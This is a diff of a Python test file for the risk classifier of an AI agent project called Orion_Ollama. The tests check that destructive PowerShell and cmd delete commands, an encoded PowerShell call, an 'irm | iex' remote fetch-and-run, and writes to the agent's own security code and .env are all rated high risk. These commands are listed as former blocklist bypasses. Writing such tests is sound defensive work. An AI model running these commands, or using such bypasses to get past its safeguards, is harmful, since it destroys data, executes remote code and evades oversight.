@@ -13,14 +13,24 @@ def test_leitura_nao_pede_confirmacao():
 
 
 def test_bypasses_da_blocklist_antiga_agora_bloqueiam():
-    for cmd in ["ri C:\\x -Recurse -Force", "Remove-Item C:\\x -r -fo", "cmd /c rmdir /s /q C:\\x",
-                "powershell -enc AAAA", "[IO.Directory]::Delete('C:\\x',$true)", "irm http://x | iex"]:
+    for cmd in [
+        "ri C:\\x -Recurse -Force",
+        "Remove-Item C:\\x -r -fo",
+        "cmd /c rmdir /s /q C:\\x",
+        "powershell -enc AAAA",
+        "[IO.Directory]::Delete('C:\\x',$true)",
+        "irm http://x | iex",
+    ]:
         assert risco("executar_comando", cmd=cmd) == "alto", cmd
         assert risco("iniciar_processo_bg", nome="x", comando=cmd) == "alto", cmd
 
 
 def test_escrever_no_codigo_do_orion_e_alto_risco():
-    for rel in ["Orion_Ollama/orion_seguranca.py", "Orion_Ollama/.env", "Orion_Ollama/tools/os_tools.py"]:
+    for rel in [
+        "Orion_Ollama/orion_seguranca.py",
+        "Orion_Ollama/.env",
+        "Orion_Ollama/tools/os_tools.py",
+    ]:
         caminho = str(seg._RAIZ_PROJETO) + "/" + rel
         assert risco("escrever_arquivo", path=caminho, conteudo="x") == "alto", rel
         assert risco("gerar_documento", tipo="txt", conteudo="x", path=caminho) == "alto", rel
